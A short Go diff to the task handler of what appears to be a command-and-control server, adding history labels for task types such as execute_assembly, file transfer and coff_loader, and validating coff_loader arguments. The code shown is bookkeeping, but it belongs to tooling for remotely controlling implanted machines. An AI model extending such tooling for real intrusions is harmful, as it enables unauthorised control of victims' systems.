@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"log/slog"
 	"net/http"
+	"strings"
 	"sync"
 
 	"c2server/internal/history"
@@ -76,13 +77,13 @@ func (h *Handler) task(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// برای history فعلاً command را ثبت می‌کنیم.
 	historyValue := task.Command
-
-	if task.Type == "payload" {
-		historyValue = "payload:" + task.PayloadID
+	switch task.Type {
+	case "payload", "execute_assembly", "file_upload", "file_download":
+		historyValue = task.Type + ":" + task.PayloadID
+	case "coff_loader":
+		historyValue = "coff_loader:" + strings.Join(task.CoffArgs, " ")
 	}
-
 	entryID, _ := h.history.Begin(id, historyValue)
 
 	h.mu.Lock()
@@ -153,6 +154,15 @@ func (h *Handler) queueCmd(w http.ResponseWriter, r *http.Request) {
 	}
 
 	switch task.Type {
+
+	case "coff_loader":
+		if len(task.CoffArgs) == 0 || task.CoffArgs[0] == "" {
+			writeError(w, http.StatusBadRequest,
+				"coff_loader task requires coff_args[0] (url or id)")
+			return
+		}
+		task.Command = "" // clear unrelated fields
+		task.PayloadID = ""
 
 	case "shell":
 		if task.Command == "" {
